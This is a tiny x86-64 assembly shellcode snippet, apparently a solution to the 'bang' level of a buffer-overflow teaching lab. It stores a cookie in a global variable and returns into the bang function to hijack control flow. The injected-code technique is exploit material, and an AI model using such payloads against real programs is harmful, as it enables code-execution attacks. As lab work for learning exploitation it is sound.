.section .text
.globl _start
_start:
    movl $0x628237a4, 0x405240   # global_value = cookie
    pushq $0x401469              # push bang + 0x1d
    ret                          # ret 到 bang 分支
